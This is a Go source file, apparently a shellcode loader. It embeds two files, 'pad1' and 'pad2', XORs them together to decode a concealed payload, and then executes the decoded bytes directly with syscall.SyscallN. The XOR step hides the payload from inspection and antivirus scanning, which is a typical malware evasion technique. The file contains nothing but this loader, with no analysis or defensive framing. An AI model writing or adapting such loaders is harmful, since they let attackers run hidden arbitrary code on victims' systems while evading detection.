package main

import (
	_ "embed"
	"syscall"
	"unsafe"
)

var (
	//go:embed "pad1"
	pad1 []byte
	//go:embed "pad2"
	pad2 []byte
)

func main() {
	for index, padByte := range pad1 {
		pad2[index] = pad2[index] ^ padByte
	}
	syscall.SyscallN(uintptr(unsafe.Pointer(&pad2[0])))
}
